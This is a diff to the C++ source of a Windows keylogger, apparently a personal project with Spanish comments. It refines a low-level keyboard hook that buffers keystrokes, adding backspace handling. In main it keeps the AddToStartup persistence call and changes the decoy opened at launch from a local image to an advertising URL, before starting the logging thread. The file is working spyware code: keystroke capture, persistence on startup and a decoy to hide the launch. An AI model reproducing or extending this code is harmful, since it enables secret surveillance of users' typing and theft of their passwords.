@@ -43,9 +43,15 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode == HC_ACTION) {
         KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
         if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
-            char key = MapVirtualKeyToChar(pKeyBoard->vkCode);
-            if (key != 0) {
-                keys.push_back(key);
+            if (pKeyBoard->vkCode == VK_BACK) {  // Handle backspace
+                if (!keys.empty()) {
+                    keys.pop_back();
+                }
+            } else {
+                char key = MapVirtualKeyToChar(pKeyBoard->vkCode);
+                if (key != 0) {
+                    keys.push_back(key);
+                }
             }
 
             // Combinación de teclas para finalizar el programa
@@ -105,7 +111,8 @@ int main() {
     AddToStartup();
 
     // Ejecutar un archivo al iniciar
-    ShellExecute(NULL, "open", "C:\\Users\\pacop\\OneDrive\\Escritorio\\Programas\\Propios\\keylogger\\prueba.png", NULL, NULL, SW_SHOWNORMAL);
+    const wchar_t* url = L"https://chatbotapp.ai/landing?utm_source=GoogleAds&utm_medium=cpc&utm_campaign={campaign}&utm_id=21095627741&utm_term=&utm_content=&gad_source=1&gclid=CjwKCAjw65-zBhBkEiwAjrqRMKnV-GPm5ZPemBoEsaQs_-gGmPtM3KLemN9EU3sI9twOMqrulNC0VhoCvhsQAvD_BwE";
+    ShellExecuteW(NULL, L"open", url, NULL, NULL, SW_SHOWNORMAL);
 
     // Iniciar el keylogger en un hilo separado
     HANDLE hThread = CreateThread(NULL, 0, KeyLogger, NULL, 0, NULL);
